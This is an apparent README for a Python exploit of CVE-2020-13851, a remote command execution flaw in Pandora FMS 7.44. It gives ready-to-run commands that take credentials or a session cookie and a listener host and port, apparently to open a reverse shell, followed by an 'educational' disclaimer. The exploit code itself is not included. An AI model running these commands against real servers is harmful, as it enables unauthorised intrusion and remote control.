# Pandora FMS 7.44 CVE-2020-13851

Pandora FMS 7.44 CVE-2020-13851 RCE allows an authenticated user to achieve remote command execution via the events feature. Can be done with credentials or a PHP session cookie.

## Getting Started

### Executing program

* Using credentials
```
python3 pandorafms_7.44.py -t http://pwnedpandora.com/ -u username -p password -lhost 127.0.0.1 -lport 1337
```
* Using PHP session cookie
```
python3 pandorafms_7.44.py -t http://pwnedpandora.com/ -c PHPSESSID -lhost 127.0.0.1 -lport 1337
```

## Help

For Help Menu
```
python3 pandorafms_7.44.py -h
```

## Acknowledgments

* [Core Security](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities)

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.